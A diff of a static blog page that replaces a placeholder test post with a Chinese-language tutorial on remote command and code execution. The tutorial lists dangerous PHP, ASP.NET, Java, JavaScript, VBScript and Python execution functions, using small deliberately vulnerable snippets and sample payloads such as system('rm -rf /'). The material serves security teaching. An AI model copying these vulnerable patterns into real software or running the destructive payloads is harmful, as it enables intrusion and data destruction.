@@ -7,7 +7,7 @@
   <meta name="referrer" content="no-referrer" />
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2024/07/10/test-my-site/"/>
+  <link rel="canonical" href="http://example.com/2024/08/16/rce命令执行-代码执行/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -34,21 +34,22 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>test_my_site - blog</title>
-  <meta name="keywords" content="test,null">
+  <title>RCE命令执行&代码执行 - blog</title>
+  <meta name="keywords" content="RCE,web安全,null">
   <meta desc name="description" content="this is my blog - mujietongxue - blog">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="test_my_site">
-<meta property="og:url" content="http://example.com/2024/07/10/test-my-site/index.html">
+<meta property="og:title" content="RCE命令执行&amp;代码执行">
+<meta property="og:url" content="http://example.com/2024/08/16/RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="blog">
-<meta property="og:description" content="hello world！ 1 21qqqq 12345111&lt;?phpecho &quot;Hello, World!&quot;;?&gt;">
+<meta property="og:description" content="介绍RCE(Remote Code&#x2F;Command Execute)远程代码&#x2F;命令执行：是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。 黑盒测试：测试网站特殊功能点，比如ping等(推荐) 白盒测试：通过代码审计，审计应用中存">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2024-07-10T06:46:52.000Z">
-<meta property="article:modified_time" content="2024-07-23T14:52:02.699Z">
+<meta property="article:published_time" content="2024-08-16T14:12:18.000Z">
+<meta property="article:modified_time" content="2024-08-28T15:05:56.313Z">
 <meta property="article:author" content="mujietongxue">
-<meta property="article:tag" content="test">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="web安全">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -1630,7 +1631,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1723732513352),
+    lastupdate: new Date(1724857605771),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo"],
       for_post: ["toc"],
@@ -2413,7 +2414,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/10/test-my-site/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/16/RCE命令执行-代码执行/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="blog">
   </span>
@@ -2434,7 +2435,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        test_my_site
+        RCE命令执行&代码执行
       </h1>
       <div class='new-meta-box'>
         
@@ -2453,10 +2454,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/test/">test</a>
+    <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/test/" itemprop="url"><span itemprop="name">test</span></a>
+        <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url"><span itemprop="name">渗透测试</span></a>
       </span>
     
   </div>
@@ -2465,10 +2466,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-07-10T14:46:52+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-08-16T22:12:18+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Jul 10, 2024</p>
+    <p>发布于：Aug 16, 2024</p>
   </a>
 </div>
 
@@ -2491,13 +2492,489 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h1 id="hello-world！"><a href="#hello-world！" class="headerlink" title="hello world！"></a>hello world！</h1><ul>
-<li>1<ul>
-<li>2<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qqqq</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">111</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hello, World!&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+    <p><img src="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/RCE.jpg" class="lazyload" data-srcset="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/RCE.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="RCE"></p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>RCE(Remote Code&#x2F;Command Execute)远程代码&#x2F;命令执行：</strong>是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p>
+<p>黑盒测试：测试网站特殊功能点，比如ping等(推荐)</p>
+<p>白盒测试：通过代码审计，审计应用中存在的危险函数是否进行了严格过滤</p>
+<h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><h3 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h3><p><strong>一、PHP中的命令执行函数</strong></p>
+<ol>
+<li><code>system()</code></li>
+</ol>
+<ul>
+<li><p><strong>描述</strong>：执行外部程序并显示输出。</p>
+</li>
+<li><p>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;ls -la&#x27;);</span><br><span class="line">直接输出结果到浏览器</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="2">
+<li><code>exec()</code></li>
+</ol>
+<ul>
+<li><p><strong>描述</strong>：执行外部程序，返回最后一行的输出。</p>
+</li>
+<li><p>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = exec(&#x27;ls -la&#x27;);</span><br><span class="line">不会直接显示输出，通常用于捕获命令的输出进行处理。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="3">
+<li><code>shell_exec()</code></li>
+</ol>
+<ul>
+<li><p><strong>描述</strong>：通过shell执行命令并返回完整的输出。</p>
+</li>
+<li><p>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = shell_exec(&#x27;ls -la&#x27;);</span><br><span class="line">返回完整输出，适合需要获取所有输出的场景。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="4">
+<li><code>passthru()</code></li>
+</ol>
+<ul>
+<li><p><strong>描述</strong>：执行外部程序并将原始输出直接传送到浏览器，通常用于二进制数据。</p>
+</li>
+<li><p>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passthru(&#x27;ls -la&#x27;);</span><br><span class="line">直接传送原始输出，可能包含特殊字符或二进制数据。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="5">
+<li><code>pcntl_exec()</code></li>
+</ol>
+<ul>
+<li><p><strong>描述</strong>：执行指定的程序，完全替换当前进程。</p>
+</li>
+<li><p>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec(&#x27;/bin/ls&#x27;, [&#x27;-la&#x27;]);</span><br><span class="line">该函数不会返回，因为它会直接替换当前的PHP进程。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="6">
+<li><code>popen()</code></li>
+</ol>
+<ul>
+<li><p><strong>描述</strong>：打开进程文件指针，用于读取或写入。</p>
+</li>
+<li><p>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$handle = popen(&#x27;ls -la&#x27;, &#x27;r&#x27;);</span><br><span class="line">适用于逐行读取或写入命令输出的场景。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="7">
+<li><code>proc_open()</code></li>
+</ol>
+<ul>
+<li><p><strong>描述</strong>：执行一个命令，并以管道方式打开该命令的输入&#x2F;输出流。</p>
+</li>
+<li><p>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$descriptorspec = [</span><br><span class="line">  0 =&gt; [&#x27;pipe&#x27;, &#x27;r&#x27;],  // stdin</span><br><span class="line">  1 =&gt; [&#x27;pipe&#x27;, &#x27;w&#x27;],  // stdout</span><br><span class="line">  2 =&gt; [&#x27;pipe&#x27;, &#x27;w&#x27;]   // stderr</span><br><span class="line">];</span><br><span class="line">$process = proc_open(&#x27;ls -la&#x27;, $descriptorspec, $pipes);</span><br><span class="line">功能强大，适用于需要控制多个输入/输出流的场景。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="8">
+<li><code>ob_start()</code></li>
+</ol>
+<ul>
+<li><p><strong>描述</strong>：开启输出缓冲，脚本输出的内容会被存储在内部缓冲区中，而不会立即输出到浏览器。</p>
+</li>
+<li><p>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ob_start(&quot;system&quot;);</span><br><span class="line">echo &quot;whoami&quot;;</span><br><span class="line">ob_end_flush();</span><br><span class="line"></span><br><span class="line">`ob_end_flush()`可以将缓冲区的内容输出，而`ob_end_clean()`则会静默丢弃缓冲区的内容。</span><br><span class="line">可以使用`ob_get_contents()`函数将缓冲区的内容复制到一个字符串变量中。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>二、ASP.NET中的命令执行方法</strong></p>
+<ol>
+<li><code>System.Diagnostics.Process.Start()</code></li>
+</ol>
+<ul>
+<li><p><strong>描述</strong>：启动一个进程以执行指定的程序或命令。</p>
+</li>
+<li><p>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.Diagnostics.Process.Start(&quot;notepad.exe&quot;);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="2">
+<li><code>System.Diagnostics.ProcessStartInfo</code></li>
+</ol>
+<ul>
+<li><p><strong>描述</strong>：提供启动进程的详细配置信息，如命令、参数、工作目录等。</p>
+</li>
+<li><p>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var startInfo = new System.Diagnostics.ProcessStartInfo</span><br><span class="line">&#123;</span><br><span class="line">    FileName = &quot;cmd.exe&quot;,</span><br><span class="line">    Arguments = &quot;/c dir&quot;,</span><br><span class="line">    RedirectStandardOutput = true,</span><br><span class="line">    UseShellExecute = false,</span><br><span class="line">    CreateNoWindow = true</span><br><span class="line">&#125;;</span><br><span class="line">var process = System.Diagnostics.Process.Start(startInfo);</span><br><span class="line">string output = process.StandardOutput.ReadToEnd();</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>三、Java中的命令执行方法</strong></p>
+<ol>
+<li><code>java.lang.Runtime.getRuntime()</code></li>
+</ol>
+<ul>
+<li><p><strong>描述</strong>：获取当前Java应用程序的运行时环境。</p>
+</li>
+<li><p>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">提供对系统资源和环境的访问。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="2">
+<li><code>Runtime.exec()</code></li>
+</ol>
+<ul>
+<li><p><strong>描述</strong>：通过运行时环境执行外部命令。</p>
+</li>
+<li><p>用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;notepad.exe&quot;);</span><br><span class="line">返回一个`Process`对象，可以通过它来处理进程的输入输出流。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h3><p><strong>1.PHP代码执行</strong></p>
+<p><strong>1.1 <code>eval()</code></strong></p>
+<p><code>eval()</code>函数用于将传入的字符串作为PHP代码执行。由于<code>eval()</code>会直接执行传入的字符串，因此如果该字符串包含恶意代码，<code>eval()</code>将执行该恶意代码，从而导致RCE漏洞。下面是一个简单的例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$malicious_code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]; <span class="comment">// 从用户输入获取代码</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$malicious_code</span>); <span class="comment">// 执行用户输入的代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，假设用户输入<code>$_GET[&#39;code&#39;]</code>为<code>phpinfo();</code>，则<code>eval()</code>会执行<code>phpinfo()</code>函数，展示服务器的PHP配置信息。如果攻击者输入类似<code>system(&#39;rm -rf /&#39;);</code>的代码，则会导致服务器文件被删除。</p>
+<p><strong>1.2 <code>assert()</code></strong></p>
+<p><code>assert()</code>函数在PHP中的作用类似于<code>eval()</code>，即可以执行传入的字符串作为PHP代码。<code>assert()</code>原本用于断言条件是否为真，但它也能被用于执行任意PHP代码。以下是一个使用<code>assert()</code>的例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]); <span class="comment">// 执行用户输入的代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入<code>$_GET[&#39;code&#39;]</code>为<code>phpinfo();</code>，则<code>assert()</code>将执行<code>phpinfo()</code>，同样可以引发RCE漏洞。</p>
+<p><strong>1.3 <code>preg_replace()</code> + <code>/e</code> 修饰符</strong></p>
+<p><code>preg_replace()</code>函数用于正则表达式的搜索和替换。在PHP 5.5.0之前，<code>preg_replace()</code>支持<code>/e</code>修饰符，它允许将替换部分当作PHP代码执行。这一特性使得<code>preg_replace()</code>成为了潜在的安全风险。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/.*/e&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>], <span class="string">&quot;input_string&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入<code>$_GET[&#39;code&#39;]</code>为<code>phpinfo();</code>，<code>preg_replace()</code>会执行这段代码，导致RCE漏洞。在PHP 5.5.0之后，<code>/e</code>修饰符已被废弃，因其带来的安全隐患过大。</p>
+<p><strong>1.4 <code>create_function()</code></strong></p>
+<p><code>create_function()</code>用于创建匿名函数，如果传入的参数未经过严格过滤，可能会导致任意代码执行。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$arg&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]); <span class="comment">// 创建匿名函数</span></span><br><span class="line"><span class="variable">$func</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入<code>$_GET[&#39;code&#39;]</code>为<code>echo $arg; phpinfo();</code>，则会先输出<code>&#39;test&#39;</code>，然后执行<code>phpinfo()</code>。</p>
+<p><strong>1.5 <code>array_map()</code></strong></p>
+<p><code>array_map()</code>函数将用户自定义函数应用到数组的每个元素上。如果用户自定义函数可控，可能导致RCE。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入<code>$_GET[&#39;func&#39;]</code>为<code>phpinfo</code>，<code>array_map()</code>会执行<code>phpinfo(&#39;test&#39;)</code>，导致RCE漏洞。</p>
+<p><strong>1.6 <code>call_user_func()</code> 和 <code>call_user_func_array()</code></strong></p>
+<p><code>call_user_func()</code>和<code>call_user_func_array()</code>函数用于调用回调函数。如果回调函数可控，则可能导致RCE。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>], <span class="string">&#x27;param&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入<code>$_GET[&#39;func&#39;]</code>为<code>phpinfo</code>，则会执行<code>phpinfo(&#39;param&#39;)</code>。</p>
+<p>类似地，<code>call_user_func_array()</code>也有相同的风险：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;param&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>1.7 <code>$&#123;&#125;</code> 语法</strong></p>
+<p>在PHP中，<code>$&#123;&#125;</code>是一种特殊的语法，允许动态执行代码。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$&#123;<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]&#125;();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入<code>$_GET[&#39;var&#39;]</code>为<code>phpinfo</code>，将执行<code>phpinfo()</code>。</p>
+<p><strong>1.8 <code>array_filter()</code></strong></p>
+<p><code>array_filter()</code>函数允许将数组的每个元素传递给回调函数，并根据回调函数的返回值决定是否保留该元素。如果回调函数可控，可能导致RCE：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]), <span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入<code>$_GET[&#39;input&#39;]</code>为<code>phpinfo();</code>，<code>array_filter()</code>会执行<code>assert(&#39;phpinfo();&#39;)</code>，导致RCE漏洞。</p>
+<p><strong>1.9 <code>usort()</code></strong></p>
+<p><code>usort()</code>函数使用用户自定义的比较函数对数组中的值进行排序。如果用户自定义函数可控，可能导致RCE：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$array</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入<code>$_GET[&#39;func&#39;]</code>为<code>assert</code>，则会执行<code>assert</code>函数。</p>
+<p><strong>2. JavaScript中的代码执行</strong></p>
+<p>JavaScript中的<code>eval()</code>函数与PHP的<code>eval()</code>类似，都是潜在的危险函数。<code>eval()</code>函数将传入的字符串当作JavaScript代码执行，如果传入的数据未经验证，可能导致XSS（跨站脚本攻击）或RCE。</p>
+<p><strong>2.1 <code>eval()</code></strong></p>
+<p>在JavaScript中，<code>eval()</code>函数直接执行传入的字符串作为JavaScript代码。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let code = &quot;alert(&#x27;Hello, World!&#x27;)&quot;;</span><br><span class="line">eval(code); // 执行alert()函数</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>code</code>的值由用户输入控制，攻击者可以通过注入恶意代码实现任意脚本执行。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let user_input = prompt(&quot;Enter some code:&quot;);</span><br><span class="line">eval(user_input); // 直接执行用户输入的代码</span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入<code>alert(&#39;XSS&#39;)</code>，则会弹出一个包含“XSS”的提示框。这种方式可以进一步扩展为更复杂的攻击，例如窃取用户会话、执行恶意代码等。</p>
+<p><strong>3. VBScript中的代码执行</strong></p>
+<p>VBScript虽然不再流行，但在一些旧系统中仍有使用。它也存在类似的安全风险，尤其是在处理用户输入时。</p>
+<p><strong>3.1 <code>Execute</code></strong></p>
+<p><code>Execute</code>函数用于执行字符串形式的VBScript代码。与<code>eval()</code>类似，它能够执行任何传入的字符串，因此也存在RCE的风险。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim code</span><br><span class="line">code = &quot;MsgBox &#x27;Hello, World!&#x27;&quot;</span><br><span class="line">Execute code</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>code</code>的值来自用户输入，攻击者可以注入恶意代码。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vbscript复制代码Dim user_input</span><br><span class="line">user_input = InputBox(&quot;Enter some code:&quot;)</span><br><span class="line">Execute user_input</span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入<code>MsgBox &#39;RCE&#39;</code>，则会弹出一个包含“RCE”的提示框。</p>
+<p><strong>3.2 <code>Eval</code></strong></p>
+<p><code>Eval</code>函数用于计算传入的表达式并返回其值。如果输入未经验证，可能导致任意代码执行。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim result</span><br><span class="line">result = Eval(&quot;1 + 1&quot;)</span><br><span class="line">MsgBox result</span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入的表达式包含恶意代码，<code>Eval</code>会执行该代码，可能导致安全问题。</p>
+<p><strong>4. Python中的代码执行</strong></p>
+<p>Python中也存在类似于<code>eval()</code>的危险函数，<code>exec()</code>和<code>eval()</code>函数可以执行传入的字符串作为Python代码，从而引发RCE漏洞。</p>
+<p><strong>4.1 <code>exec()</code></strong></p>
+<p><code>exec()</code>函数用于动态执行Python代码。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code = &quot;print(&#x27;Hello, World!&#x27;)&quot;</span><br><span class="line">exec(code) # 执行print()函数</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>code</code>的内容由用户输入控制，攻击者可以通过注入恶意代码执行任意Python代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user_input = input(&quot;Enter some code:&quot;)</span><br><span class="line">exec(user_input) # 执行用户输入的代码</span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入<code>os.system(&#39;rm -rf /&#39;)</code>，则会删除服务器上的所有文件，导致严重的RCE漏洞。</p>
+<p><strong>4.2 <code>eval()</code></strong></p>
+<p><code>eval()</code>函数用于计算传入的表达式并返回其结果。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = eval(&quot;1 + 1&quot;)</span><br><span class="line">print(result) # 输出 2</span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入的表达式包含恶意代码，<code>eval()</code>会执行该代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user_input = input(&quot;Enter an expression:&quot;)</span><br><span class="line">result = eval(user_input) # 计算用户输入的表达式</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入<code>__import__(&#39;os&#39;).system(&#39;rm -rf /&#39;)</code>，则会导致系统命令被执行，从而引发RCE漏洞。</p>
+<h2 id="shell命令操作符"><a href="#shell命令操作符" class="headerlink" title="shell命令操作符"></a>shell命令操作符</h2><p><img src="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/shell_ml.png" class="lazyload" data-srcset="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/shell_ml.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="shell_ml"></p>
+<p><strong>1.分号 (<code>;</code>) 用法</strong></p>
+<ul>
